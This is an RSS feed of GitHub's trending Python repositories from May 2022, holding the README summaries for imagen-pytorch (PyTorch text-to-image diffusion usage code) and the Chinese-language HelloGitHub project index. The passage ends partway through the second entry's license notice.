<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-05-29T01:33:11Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>lucidrains/imagen-pytorch</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/lucidrains/imagen-pytorch</id>
    <link href="https://github.com/lucidrains/imagen-pytorch" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Implementation of Imagen, Google&#39;s Text-to-Image Neural Network, in Pytorch&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/lucidrains/imagen-pytorch/main/imagen.png&#34; width=&#34;450px&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Imagen - Pytorch (wip)&lt;/h2&gt; &#xA;&lt;p&gt;Implementation of &lt;a href=&#34;https://gweb-research-imagen.appspot.com/&#34;&gt;Imagen&lt;/a&gt;, Google&#39;s Text-to-Image Neural Network that beats DALL-E2, in Pytorch. It is the new SOTA for text-to-image synthesis.&lt;/p&gt; &#xA;&lt;p&gt;Architecturally, it is actually much simpler than DALL-E2. It consists of a cascading DDPM conditioned on text embeddings from a large pretrained T5 model (attention network). It also contains dynamic clipping for improved classifier free guidance, noise level conditioning, and a memory efficient unet design.&lt;/p&gt; &#xA;&lt;p&gt;It appears neither CLIP nor prior network is needed after all. And so research continues.&lt;/p&gt; &#xA;&lt;p&gt;Please join &lt;a href=&#34;https://discord.gg/xBPBXfcFHd&#34;&gt;&lt;img alt=&#34;Join us on Discord&#34; src=&#34;https://img.shields.io/discord/823813159592001537?color=5865F2&amp;amp;logo=discord&amp;amp;logoColor=white&#34;&gt;&lt;/a&gt; if you are interested in helping out with the replication with the &lt;a href=&#34;https://laion.ai/&#34;&gt;LAION&lt;/a&gt; community&lt;/p&gt; &#xA;&lt;h2&gt;Install&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ pip install imagen-pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import torch&#xA;from imagen_pytorch import Unet, Imagen&#xA;&#xA;# unet for imagen&#xA;&#xA;unet1 = Unet(&#xA;    dim = 32,&#xA;    cond_dim = 512,&#xA;    dim_mults = (1, 2, 4, 8),&#xA;    num_resnet_blocks = 3,&#xA;    layer_attns = (False, True, True, True),&#xA;    layer_cross_attns = (False, True, True, True)&#xA;)&#xA;&#xA;unet2 = Unet(&#xA;    dim = 32,&#xA;    cond_dim = 512,&#xA;    dim_mults = (1, 2, 4, 8),&#xA;    num_resnet_blocks = (2, 4, 8, 8),&#xA;    layer_attns = (False, False, False, True),&#xA;    layer_cross_attns = (False, False, False, True)&#xA;)&#xA;&#xA;# imagen, which contains the unets above (base unet and super resoluting ones)&#xA;&#xA;imagen = Imagen(&#xA;    unets = (unet1, unet2),&#xA;    image_sizes = (64, 256),&#xA;    beta_schedules = (&#39;cosine&#39;, &#39;linear&#39;),&#xA;    timesteps = 1000,&#xA;    cond_drop_prob = 0.5&#xA;).cuda()&#xA;&#xA;# mock images (get a lot of this) and text encodings from large T5&#xA;&#xA;text_embeds = torch.randn(4, 256, 768).cuda()&#xA;text_masks = torch.ones(4, 256).bool().cuda()&#xA;images = torch.randn(4, 3, 256, 256).cuda()&#xA;&#xA;# feed images into imagen, training each unet in the cascade&#xA;&#xA;for i in (1, 2):&#xA;    loss = imagen(images, text_embeds = text_embeds, text_masks = text_masks, unet_number = i)&#xA;    loss.backward()&#xA;&#xA;# do the above for many many many many steps&#xA;# now you can sample an image based on the text embeddings from the cascading ddpm&#xA;&#xA;images = imagen.sample(texts = [&#xA;    &#39;a whale breaching from afar&#39;,&#xA;    &#39;young girl blowing out candles on her birthday cake&#39;,&#xA;    &#39;fireworks with blue and green sparkles&#39;&#xA;], cond_scale = 2.)&#xA;&#xA;images.shape # (3, 3, 256, 256)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;With the &lt;code&gt;ImagenTrainer&lt;/code&gt; wrapper class, the exponential moving averages for all of the U-nets in the cascading DDPM will be automatically taken care of when calling &lt;code&gt;update&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import torch&#xA;from imagen_pytorch import Unet, Imagen, ImagenTrainer&#xA;&#xA;# unet for imagen&#xA;&#xA;unet1 = Unet(&#xA;    dim = 32,&#xA;    cond_dim = 512,&#xA;    dim_mults = (1, 2, 4, 8),&#xA;    num_resnet_blocks = 3,&#xA;    layer_attns = (False, True, True, True),&#xA;)&#xA;&#xA;unet2 = Unet(&#xA;    dim = 32,&#xA;    cond_dim = 512,&#xA;    dim_mults = (1, 2, 4, 8),&#xA;    num_resnet_blocks = (2, 4, 8, 8),&#xA;    layer_attns = (False, False, False, True),&#xA;    layer_cross_attns = (False, False, False, True)&#xA;)&#xA;&#xA;# imagen, which contains the unets above (base unet and super resoluting ones)&#xA;&#xA;imagen = Imagen(&#xA;    unets = (unet1, unet2),&#xA;    text_encoder_name = &#39;t5-large&#39;,&#xA;    image_sizes = (64, 256),&#xA;    beta_schedules = (&#39;cosine&#39;, &#39;linear&#39;),&#xA;    timesteps = 1000,&#xA;    cond_drop_prob = 0.5&#xA;).cuda()&#xA;&#xA;# wrap imagen with the trainer class&#xA;&#xA;trainer = ImagenTrainer(imagen)&#xA;&#xA;# mock images (get a lot of this) and text encodings from large T5&#xA;&#xA;text_embeds = torch.randn(4, 256, 1024).cuda()&#xA;text_masks = torch.ones(4, 256).bool().cuda()&#xA;images = torch.randn(4, 3, 256, 256).cuda()&#xA;&#xA;# feed images into imagen, training each unet in the cascade&#xA;&#xA;for i in (1, 2):&#xA;    loss = trainer(images, text_embeds = text_embeds, text_masks = text_masks, unet_number = i)&#xA;    trainer.update(unet_number = i)&#xA;&#xA;# do the above for many many many many steps&#xA;# now you can sample an image based on the text embeddings from the cascading ddpm&#xA;&#xA;images = trainer.sample(texts = [&#xA;    &#39;a puppy looking anxiously at a giant donut on the table&#39;,&#xA;    &#39;the milky way galaxy in the style of monet&#39;&#xA;], cond_scale = 2.)&#xA;&#xA;images.shape # (2, 3, 256, 256)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Shoutouts&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://stability.ai/&#34;&gt;StabilityAI&lt;/a&gt; for the generous sponsorship, as well as my other sponsors out there&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://huggingface.co/&#34;&gt;🤗 Huggingface&lt;/a&gt; for their amazing transformers library. The text encoder portion is pretty much taken care of because of them&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jorgemcgomes&#34;&gt;Jorge Gomes&lt;/a&gt; for helping out with the T5 loading code and advice on the correct T5 version&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/crowsonkb&#34;&gt;Katherine Crowson&lt;/a&gt;, for her &lt;a href=&#34;https://github.com/crowsonkb/v-diffusion-jax/raw/master/diffusion/utils.py&#34;&gt;beautiful code&lt;/a&gt;, which helped me understand the continuous time version of gaussian diffusion&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;You? It isn&#39;t done yet, chip in if you are a researcher or skilled ML engineer&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Todo&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; use huggingface transformers for T5-small text embeddings&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; add dynamic thresholding&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; add dynamic thresholding DALLE2 and video-diffusion repository as well&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; allow for one to set T5-large (and perhaps small factory method to take in any huggingface transformer)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; add the lowres noise level with the pseudocode in appendix, and figure out what is this sweep they do at inference time&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; port over some training code from DALLE2&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; need to be able to use a different noise schedule per unet (cosine was used for base, but linear for SR)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; just make one master-configurable unet&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; complete resnet block (biggan inspired? but with groupnorm) - complete self attention&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; complete conditioning embedding block (and make it completely configurable, whether it be attention, film etc)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; consider using perceiver-resampler from &lt;a href=&#34;https://github.com/lucidrains/flamingo-pytorch&#34;&gt;https://github.com/lucidrains/flamingo-pytorch&lt;/a&gt; in place of attention pooling&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; add attention pooling option, in addition to cross attention and film&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; add optional cosine decay schedule with warmup, for each unet, to trainer&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; figure out if learned variance was used at all, and remove it if it was inconsequential&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; switch to continuous timesteps instead of discretized, as it seems that is what they used for all stages - first figure out the linear noise schedule case from the variational ddpm paper &lt;a href=&#34;https://openreview.net/forum?id=2LdBqxc1Yv&#34;&gt;https://openreview.net/forum?id=2LdBqxc1Yv&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; exercise efficient attention expertise + explore skip layer excitation&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; try out grid attention&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Citations&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bibtex&#34;&gt;@inproceedings{Saharia2022PhotorealisticTD,&#xA;    title   = {Photorealistic Text-to-Image Diffusion Models with Deep Language Understanding},&#xA;    author  = {Chitwan Saharia and William Chan and Saurabh Saxena and Lala Li and Jay Whang and Emily L. Denton and Seyed Kamyar Seyed Ghasemipour and Burcu Karagol Ayan and Seyedeh Sara Mahdavi and Raphael Gontijo Lopes and Tim Salimans and Jonathan Ho and David Fleet and Mohammad Norouzi},&#xA;    year    = {2022}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bibtex&#34;&gt;@inproceedings{Tu2022MaxViTMV,&#xA;    title   = {MaxViT: Multi-Axis Vision Transformer},&#xA;    author  = {Zhengzhong Tu and Hossein Talebi and Han Zhang and Feng Yang and Peyman Milanfar and Alan Conrad Bovik and Yinxiao Li},&#xA;    year    = {2022},&#xA;    url     = {https://arxiv.org/abs/2204.01697}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bibtex&#34;&gt;@article{Alayrac2022Flamingo,&#xA;    title   = {Flamingo: a Visual Language Model for Few-Shot Learning},&#xA;    author  = {Jean-Baptiste Alayrac et al},&#xA;    year    = {2022}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>521xueweihan/HelloGitHub</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/521xueweihan/HelloGitHub</id>
    <link href="https://github.com/521xueweihan/HelloGitHub" rel="alternate"></link>
    <summary type="html">&lt;p&gt;分享 GitHub 上有趣、入门级的开源项目。Share interesting, entry-level open source projects on GitHub.&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://cdn.jsdelivr.net/gh/521xueweihan/img_logo@main/logo/readme.gif&#34;&gt; &lt;br&gt;中文 | &lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/README_en.md&#34;&gt;English&lt;/a&gt; &lt;br&gt;分享 GitHub 上有趣、入门级的开源项目。&lt;br&gt;兴趣是最好的老师，这里能够帮你找到编程的兴趣！ &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://cdn.jsdelivr.net/gh/521xueweihan/img_logo@main/logo/weixin.png&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Talk-%E5%BE%AE%E4%BF%A1%E7%BE%A4-brightgreen.svg?style=popout-square&#34; alt=&#34;WeiXin&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/521xueweihan/HelloGitHub/stargazers&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/stars/521xueweihan/HelloGitHub.svg?style=popout-square&#34; alt=&#34;GitHub stars&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/521xueweihan/HelloGitHub/issues&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/issues/521xueweihan/HelloGitHub.svg?style=popout-square&#34; alt=&#34;GitHub issues&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://weibo.com/hellogithub&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/%E6%96%B0%E6%B5%AA-Weibo-red.svg?style=popout-square&#34; alt=&#34;Sina Weibo&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;h2&gt;简介&lt;/h2&gt; &#xA;&lt;p&gt;HelloGitHub 分享 GitHub 上有趣、入门级的开源项目。&lt;strong&gt;每月 28 号&lt;/strong&gt;以月刊的形式&lt;a href=&#34;https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzA5MzYyNzQ0MQ==&amp;amp;action=getalbum&amp;amp;album_id=1331197538447310849#wechat_redirect&#34;&gt;更新发布&lt;/a&gt;，内容包括：&lt;strong&gt;有趣、入门级的开源项目&lt;/strong&gt;、&lt;strong&gt;开源书籍&lt;/strong&gt;、&lt;strong&gt;实战项目&lt;/strong&gt;、&lt;strong&gt;企业级项目&lt;/strong&gt;等，让你用很短时间感受到开源的魅力，爱上开源！&lt;/p&gt; &#xA;&lt;h2&gt;内容&lt;/h2&gt; &#xA;&lt;p&gt;获得更好的阅读体验 &lt;a href=&#34;https://hellogithub.com&#34;&gt;官网&lt;/a&gt; 或 &lt;a href=&#34;https://cdn.jsdelivr.net/gh/521xueweihan/img_logo@main/logo/weixin.png&#34;&gt;HelloGitHub 公众号&lt;/a&gt;&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;span&gt;📇&lt;/span&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;span&gt;🎃&lt;/span&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;span&gt;🍺&lt;/span&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;span&gt;🍥&lt;/span&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;img alt=&#34;octocat&#34; src=&#34;https://github.githubassets.com/images/icons/emoji/octocat.png?v8&#34;&gt;)&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/74/HelloGitHub74.md&#34;&gt;第 74 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/73/HelloGitHub73.md&#34;&gt;第 73 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/72/HelloGitHub72.md&#34;&gt;第 72 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/71/HelloGitHub71.md&#34;&gt;第 71 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/70/HelloGitHub70.md&#34;&gt;第 70 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/69/HelloGitHub69.md&#34;&gt;第 69 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/68/HelloGitHub68.md&#34;&gt;第 68 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/67/HelloGitHub67.md&#34;&gt;第 67 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/66/HelloGitHub66.md&#34;&gt;第 66 期&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/65/HelloGitHub65.md&#34;&gt;第 65 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/64/HelloGitHub64.md&#34;&gt;第 64 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/63/HelloGitHub63.md&#34;&gt;第 63 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/62/HelloGitHub62.md&#34;&gt;第 62 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/61/HelloGitHub61.md&#34;&gt;第 61 期&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/60/HelloGitHub60.md&#34;&gt;第 60 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/59/HelloGitHub59.md&#34;&gt;第 59 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/58/HelloGitHub58.md&#34;&gt;第 58 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/57/HelloGitHub57.md&#34;&gt;第 57 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/56/HelloGitHub56.md&#34;&gt;第 56 期&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/55/HelloGitHub55.md&#34;&gt;第 55 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/54/HelloGitHub54.md&#34;&gt;第 54 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/53/HelloGitHub53.md&#34;&gt;第 53 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/52/HelloGitHub52.md&#34;&gt;第 52 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/51/HelloGitHub51.md&#34;&gt;第 51 期&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/50/HelloGitHub50.md&#34;&gt;第 50 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/49/HelloGitHub49.md&#34;&gt;第 49 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/48/HelloGitHub48.md&#34;&gt;第 48 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/47/HelloGitHub47.md&#34;&gt;第 47 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/46/HelloGitHub46.md&#34;&gt;第 46 期&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/45/HelloGitHub45.md&#34;&gt;第 45 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/44/HelloGitHub44.md&#34;&gt;第 44 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/43/HelloGitHub43.md&#34;&gt;第 43 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/42/HelloGitHub42.md&#34;&gt;第 42 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/41/HelloGitHub41.md&#34;&gt;第 41 期&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/40/HelloGitHub40.md&#34;&gt;第 40 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/39/HelloGitHub39.md&#34;&gt;第 39 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/38/HelloGitHub38.md&#34;&gt;第 38 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/37/HelloGitHub37.md&#34;&gt;第 37 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/36/HelloGitHub36.md&#34;&gt;第 36 期&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/35/HelloGitHub35.md&#34;&gt;第 35 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/34/HelloGitHub34.md&#34;&gt;第 34 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/33/HelloGitHub33.md&#34;&gt;第 33 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/32/HelloGitHub32.md&#34;&gt;第 32 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/31/HelloGitHub31.md&#34;&gt;第 31 期&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/05/HelloGitHub05.md&#34;&gt;第 05 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/04/HelloGitHub04.md&#34;&gt;第 04 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/03/HelloGitHub03.md&#34;&gt;第 03 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/02/HelloGitHub02.md&#34;&gt;第 02 期&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/521xueweihan/HelloGitHub/master/content/01/HelloGitHub01.md&#34;&gt;第 01 期&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;欢迎&lt;a href=&#34;https://github.com/521xueweihan/HelloGitHub/issues/new&#34;&gt;推荐或自荐&lt;/a&gt;项目成为 &lt;strong&gt;HelloGitHub&lt;/strong&gt; 的&lt;a href=&#34;https://github.com/521xueweihan/HelloGitHub/raw/master/content/contributors.md&#34;&gt;贡献者&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;赞助&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34; style=&#34;width: 80px;&#34;&gt; &lt;a href=&#34;https://www.ucloud.cn/site/active/kuaijie.html?invitation_code=C1xF2ECA89A2592&#34;&gt; &lt;img src=&#34;https://cdn.jsdelivr.net/gh/521xueweihan/img_logo@main/logo/ucloud.png&#34; width=&#34;60px&#34;&gt;&lt;br&gt; &lt;sub&gt;云主机&lt;/sub&gt;&lt;br&gt; &lt;sub&gt;仅 4 元/月&lt;/sub&gt; &lt;/a&gt; &lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34; style=&#34;width: 80px;&#34;&gt; &lt;a href=&#34;https://www.upyun.com/&#34;&gt; &lt;img src=&#34;https://cdn.jsdelivr.net/gh/521xueweihan/img_logo@main/logo/upyun.png&#34; width=&#34;60px&#34;&gt;&lt;br&gt; &lt;sub&gt;CDN&lt;/sub&gt;&lt;br&gt; &lt;sub&gt;开启全网加速&lt;/sub&gt; &lt;/a&gt; &lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34; style=&#34;width: 80px;&#34;&gt; &lt;a href=&#34;https://doc.rentsoft.cn/&#34;&gt; &lt;img src=&#34;https://cdn.jsdelivr.net/gh/521xueweihan/img_logo@main/logo/im.png&#34; width=&#34;60px&#34;&gt;&lt;br&gt; &lt;sub&gt;OpenIM&lt;/sub&gt;&lt;br&gt; &lt;sub&gt;开源IM力争No.1&lt;/sub&gt; &lt;/a&gt; &lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;声明&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a rel=&#34;license&#34; href=&#34;https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh&#34;&gt;&lt;img alt=&#34;知识共享许可协议&#34; style=&#34;border-width: 0&#34; src=&#34;https://licensebuttons.net/l/by-nc-nd/4.0/88x31.png&#34;&gt;&lt;/a&gt;&lt;br&gt;本作品采用 &lt;a rel=&#34;license&#34; href=&#34;https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh&#34;&gt;署名-非商业性使用-禁止演绎 4.0 